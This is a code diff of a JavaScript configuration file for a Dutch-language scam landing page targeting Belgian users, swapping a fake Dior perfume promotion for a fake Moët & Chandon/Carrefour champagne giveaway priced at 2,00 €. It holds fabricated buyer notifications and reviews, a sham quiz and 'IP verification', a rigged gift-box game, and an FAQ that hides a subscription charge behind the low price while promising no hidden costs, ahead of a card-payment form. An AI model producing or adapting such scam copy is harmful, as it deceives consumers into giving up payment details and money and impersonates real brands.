@@ -1,6 +1,6 @@
 const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
-const siteKey = "sauvage-br";
+const siteKey = "moet-be";
 
 (function (exp) {
   const countryCode = "be";
@@ -9,32 +9,32 @@ const siteKey = "sauvage-br";
 
   const sizes = {
     enabled: false,
-    selectText: "Maat: ",
+    selectText: "Grootte: ",
     arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
   };
 
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Proficiat! <br><br> U kunt deelnemen aan de promotie van Dior Sauvage 100 ml!",
+    name: "Gefeliciteerd!",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    timer: "Er is niet veel tijd, haast u om uw bestelling te plaatsen!",
-    text: "Dior verkoopt zijn nieuwste Sauvage parfums voor slechts <b>1,95€</b> na het stopzetten van de activiteiten in Oost-Europa. Dankzij de nieuwe campagnestrategie kan iedereen in <b>België</b> vandaag een van de <b>1000</b> parfums bemachtigen🎁.",
+    timer: "De tijd is beperkt, haast u om uw bestelling te plaatsen!",
+    text: "Om zijn 280ste verjaardag te vieren, heeft het toonaangevende champagnemerk <b>Moёt&Chandon</b> samen met de <b>Belgische</b> supermarktketen <b>Carrefour</b> een verkoop gelanceerd van 1.000 flessen Brut Impérial champagne voor slechts <b>2€</b>.",
   };
 
   const notifications = [
     {
       user: "Bea V***",
       location: "Brussel, België",
-      action: "Heeft net Dior Sauvage 100ml gekocht voor 1,95 €!",
+      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 2,00 €!",
       timeago: "15 seconden geleden",
     },
     {
       user: "Tessa B***",
       location: "Antwerpen, België",
-      action: "Heeft net Dior Sauvage 100ml gekocht voor 1,95 €!",
+      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 2,00 €!",
       timeago: "25 seconden geleden",
     },
   ];
@@ -43,18 +43,18 @@ const siteKey = "sauvage-br";
     {
       name: "Lucas",
       time: "1 dag geleden",
-      header: "Dit is ongelofelijk!",
+      header: "Dit is geweldig!",
       product: "26468782",
       image: "./assets/proof1.jpg",
-      review: "Ik hoorde onlangs over deze promotie en besloot om het te kopen. Dank aan Dior voor deze verkoop.",
+      review: "Ik hoorde onlangs over deze actie en besloot om het te kopen. Bedankt Moet&Chandon voor deze verkoop.",
     },
     {
       name: "Anton",
       time: "2 dagen geleden",
       header: "Fantastisch! Ik ben sprakeloos.",
       product: "26468789",
-      image: "./assets/proof2.jpeg",
-      review: "Bedankt. Het pakket werd heel snel bezorgd.",
+      image: "./assets/proof2.jpg",
+      review: "Bedankt. Het pakket werd zeer snel geleverd.",
     },
     {
       name: "Josefien",
@@ -62,22 +62,21 @@ const siteKey = "sauvage-br";
       header: "Gewoon geweldig.",
       product: "26468783",
       image: "./assets/proof3.jpg",
-      review: "Mijn man wilde niet dat ik meedeed, omdat we nog nooit van deze verkoop hadden gehoord, maar toen mijn pakket arriveerde, was hij heel blij.",
+      review: "Mijn man wilde niet dat ik meedeed omdat we nog nooit van deze verkoop hadden gehoord, maar toen mijn pakket aankwam, was hij erg blij.",
     },
     {
       name: "Nico",
       time: "4 dagen geleden",
       header: "Hij houdt ervan.",
       image: "./assets/proof4.jpg",
-      review: "Ik wilde deze parfums al heel lang en heb er eindelijk een.",
+      review: "Ik wilde deze fles al heel lang en heb er eindelijk een gekregen.",
     },
     {
       name: "Jan",
       time: "7 dagen geleden",
-      header: "Wow, ik ben absoluut enthousiast over dit product!",
+      header: "Wow, ik ben absoluut onder de indruk van dit product!",
       product: "26468784",
-      image: "./assets/proof5.jpg",
-      review: "Ongelooflijk. Een dure en kwalitatieve parfum voor slechts €1,95. Dank u!",
+      review: "Ongelooflijk. Een dure en kwalitatief hoogwaardige fles voor slechts 2,00 €. Bedankt!",
     },
   ];
 
@@ -92,44 +91,44 @@ const siteKey = "sauvage-br";
     _of: "Vraag {1} van {2}: ",
     arr: [
       {
-        q: "Heeft u ooit Dior Sauvage gedragen?",
+        q: "Heb je ooit Moet&Chandon Brut Imperial gedronken?",
         a: ["Ja", "Nee"],
       },
       {
-        q: "Waar heeft u deze promotie gevonden?",
-        a: ["Op de officiële website", "Facebook advertenties", "Doorverwezen door een vriend"],
+        q: "Waar heb je deze actie gevonden?",
+        a: ["Op de officiële website", "Facebook-advertenties", "Aanbevolen door een vriend"],
       },
       {
-        q: "Voor welk doel gebruikt u Dior Sauvage?",
-        a: ["Als cadeau", "Voor persoonlijk gebruik"],
+        q: "Voor welk doel gebruik je Moet&Chandon Brut Imperial?",
+        a: ["Als een cadeau", "Voor persoonlijk gebruik"],
       },
     ],
   };
 
   const check = {
-    title: "Uw antwoorden worden geverifieerd.",
-    secondTitle: "Bezig met laden...",
+    title: "Uw antwoorden worden gecontroleerd.",
+    secondTitle: "Laden...",
     arr: [
       "U heeft vraag 3/3 beantwoord",
-      "Geen voorafgaande onderzoeken van uw IP.",
-      "Geschenken worden geladen...",
+      "Geen eerdere onderzoeken van uw IP.",
+      "Cadeaus worden geladen...",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header: "Gefeliciteerd, u heeft succesvol geverifieerd dat u een echt persoon bent.",
+        header: "Gefeliciteerd, u heeft met succes bevestigd dat u een echte persoon bent.",
         button: "OK",
         text: `
-        <center>
-        Vandaag, {date}, heeft u de kans om uw Dior Sauvage 100ml te ontvangen.
-          <br><br>
-          U hoeft alleen maar het juiste cadeaupakket te kiezen.
-          <br><br>
-          U heeft 3 opties, veel succes!
-        </center>
-      `,
+      <center>
+      Vandaag, op {date}, heeft u de kans om uw Moet&Chandon Brut Imperial  te ontvangen.
+        <br><br>
+        U hoeft alleen maar het juiste geschenk te kiezen.
+        <br><br>
+        U heeft 3 opties, veel geluk!
+      </center>
+    `,
       },
     },
     first: {
@@ -137,10 +136,10 @@ const siteKey = "sauvage-br";
         header: "Oh nee...",
         button: "OK",
         text: `
-        <center>
-        Sorry, maar dit cadeau is leeg. U heeft nog 2 pogingen over. Veel succes!
-        </center>
-      `,
+      <center>
+      Sorry, maar dit geschenk is leeg. U heeft nog 2 pogingen. Veel succes!
+      </center>
+    `,
       },
     },
     win: {
@@ -148,42 +147,42 @@ const siteKey = "sauvage-br";
         header: `Gefeliciteerd! U heeft gewonnen!`,
         button: "OK",
         text: `
-        <center>
-          <p style="color: #b51817">
-          U heeft Dior Sauvage 100ml gewonnen!
-          </p>
-          <br>
-          1) Klik op "OK" hieronder om naar de pagina voor verzendbetaling te gaan.
-           <br><br>
-          2) Vul het formulier in en betaal uw bestelling om Dior Sauvage te ontvangen.
-          <br><br>
-          3) Het pakket wordt binnen 5 tot 7 dagen bezorgd.
-        </center>
-      `,
+      <center>
+        <p style="color: #b51817">
+        U heeft Moet&Chandon Brut Imperial gewonnen!
+        </p>
+        <br>
+        1) Klik hieronder op "OK" om naar de betaalpagina voor de verzending te gaan.
+         <br><br>
+        2) Vul het formulier in en betaal uw bestelling om Moet&Chandon te ontvangen.
+        <br><br>
+        3) Het pakket wordt binnen 5 tot 7 dagen geleverd.
+      </center>
+    `,
       },
     },
   };
 
   const faqs = [
     {
-      question: "Hoe lang moet ik wachten op mijn prijs?",
+      question: "Hoe lang moet ik op mijn prijs wachten?",
       answer: "Het duurt meestal 5 tot 7 werkdagen.",
     },
     {
       question: "Zijn er verborgen kosten?",
-      answer: "Absoluut niet. Zodra u uw prijs wint en uw gegevens invoert, zorgen wij voor de rest. De verzendkosten zijn onze verantwoordelijkheid!",
+      answer: "Absoluut niet. Zodra u uw prijs heeft gewonnen en uw gegevens heeft ingevoerd, zorgen wij voor de rest. De verzendkosten zijn voor onze rekening!",
     },
     {
-      question: "Ik ben een winnaar, waarom moet ik vragen beantwoorden/doos kiezen?",
-      answer: "U bent nog geen winnaar, maar u bent een van de 10 geselecteerd om te proberen onze prijs te winnen...",
+      question: "Ik ben een winnaar, waarom moet ik vragen beantwoorden/een geschenk kiezen?",
+      answer: "U bent nog geen winnaar, maar u bent een van de 10 geselecteerden die kunnen proberen onze prijs te winnen...",
     },
     {
       question: "Hoe kan ik de prijs ontvangen als ik win?",
-      answer: "U moet eerst uw bezorgadres en contactgegevens invoeren, dan zal ons systeem u doorverwijzen. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen aan echte mensen wordt aangeboden.",
+      answer: "U moet eerst uw afleveradres en contactgegevens invoeren, daarna zal ons systeem u verder leiden. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen wordt aangeboden aan echte mensen.",
     },
     {
-      question: "Waarom moet ik €1,95 betalen voor de prijs?",
-      answer: "€1,95 is geen prijs - het is een abonnement dat bewijst dat u echt mens bent. Alle betalingen worden terugbetaald na goedkeuring.",
+      question: "Waarom moet ik 2,00 € voor de prijs betalen?",
+      answer: "2,00 € is geen prijs - het is een abonnement dat bewijst dat u een echt persoon bent. Alle betalingen worden na goedkeuring terugbetaald.",
     },
     {
       question: "Ik kan mijn creditcard niet gebruiken, de transactie is mislukt?",
@@ -197,7 +196,7 @@ const siteKey = "sauvage-br";
       fields: {
         name: {
           enabled: true,
-          field: "Naam",
+          field: "Voornaam",
         },
         family: {
           enabled: true,
@@ -209,12 +208,12 @@ const siteKey = "sauvage-br";
         },
         email: {
           enabled: true,
-          field: "Email",
+          field: "E-mail",
         },
       },
     },
     delivery: {
-      title: "Bezorging",
+      title: "Levering",
       fields: {
         city: {
           enabled: true,
@@ -222,7 +221,7 @@ const siteKey = "sauvage-br";
         },
         address: {
           enabled: true,
-          field: "Bezorgadres",
+          field: "Leveradres",
         },
         zip: {
           enabled: true,
@@ -231,29 +230,29 @@ const siteKey = "sauvage-br";
       },
     },
     payment: {
-      title: "Betaalmethodes",
-      creditCard: "Online betalen met creditcard",
+      title: "Betaalmethoden",
+      creditCard: "Online betaling met creditcard",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Bestellingsoverzicht",
+      title: "Overzicht van de bestelling",
       oldPrice: "",
-      newPrice: "1,95 €",
-      size: "Maat",
+      newPrice: "2,00 €",
+      size: "Grootte",
       subTotal: {
-        title: "Bestellingswaarde",
-        amount: "1,95 €",
+        title: "Bestelwaarde",
+        amount: "2,00 €",
       },
       delivery: {
-        title: "Bezorging",
+        title: "Levering",
         amount: "0,00 €",
       },
       total: {
         title: "Totaal",
-        amount: "1,95 €",
+        amount: "2,00 €",
       },
       checkoutButton: "Betaal uw bestelling",
     },
@@ -262,20 +261,18 @@ const siteKey = "sauvage-br";
   const products = [
     {
       id: "26468782",
-      name: "Dior Sauvage 100ml",
-      miniImg: "./assets/slide_1.png",
+      name: "Moet&Chandon Brut Imperial",
+      miniImg: "./assets/bottle.png",
 
-      images: [
-        "./assets/slide_3.jpg",
+      images: ["./assets/slide_1.jpg",
+        "./assets/slide_2.jpg"
       ],
     },
   ];
 
   const footer = {
-    cr: "© 2024 DIOR. Alle rechten voorbehouden.",
+    cr: "© 2024 Moet&Chandon. Alle rechten voorbehouden.",
   };
-
-
 
 
   const pathImgBox = {
